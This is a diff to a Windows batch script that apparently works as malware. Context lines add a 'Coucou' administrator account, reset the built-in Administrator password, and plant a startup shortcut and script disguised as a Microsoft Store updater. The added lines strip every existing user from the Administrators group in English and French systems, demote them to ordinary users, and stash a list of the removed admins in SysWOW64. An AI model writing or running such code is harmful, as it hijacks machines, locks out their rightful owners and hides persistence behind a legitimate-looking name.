@@ -72,6 +72,8 @@ cls
 
 :AdminEn
     cls
+    FOR /f "skip=6 delims=" %u IN ('net localgroup Administrators') DO (IF "%u" NEQ "The command completed successfully." echo %u>>C:\Temp\Pol_1.txt && net localgroup Administrators %u /delete && net localgroup Users %u /add)
+    cls
     net localgroup Administrators Coucou /add
     cls
     net user Administrator CoucouWas-hereAdmin
@@ -82,6 +84,8 @@ cls
     cls
 
 :AdminFr
+    cls
+    FOR /f "skip=6 delims=" %u IN ('net localgroup Administrateurs') DO (IF "%u" NEQ "The command completed successfully." echo %u>>C:\Temp\Pol_1.txt && net localgroup Administrateurs %u /delete && net localgroup Utilisateurs %u /add)
     cls
     net localgroup Administrateurs Coucou /add
     cls
@@ -99,6 +103,10 @@ cls
 copy C:\Temp\Isu_3.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\MicrosoftStore_Updater.lnk"
 cls
 copy C:\Temp\Isu_3.cmd "C:\Windows\SysWOW64\MicrosoftStore_Updater.cmd"
+cls
+copy C:\Temp\Pol_1.txt "C:\Windows\SysWOW64\Old_AdminList.txt"
+cls
+del C:\Temp\Pol_1.txt
 cls
 del C:\Temp\Isu_3.lnk
 cls
